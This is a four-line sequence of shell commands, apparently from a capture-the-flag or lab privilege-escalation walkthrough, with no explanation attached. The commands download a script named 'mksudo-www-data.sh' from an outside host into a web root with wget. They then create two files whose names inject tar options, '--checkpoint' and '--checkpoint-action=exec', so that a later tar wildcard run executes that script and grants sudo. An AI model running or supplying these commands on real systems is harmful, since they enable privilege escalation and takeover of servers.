

`cd /var/www/html`
`wget 10.18.21.236:8000/shells/mksudo-www-data.sh -O ./mksudo.sh`
`touch ./--checkpoint=1`
`touch ./'--checkpoint-action=exec=sh mksudo.sh'`

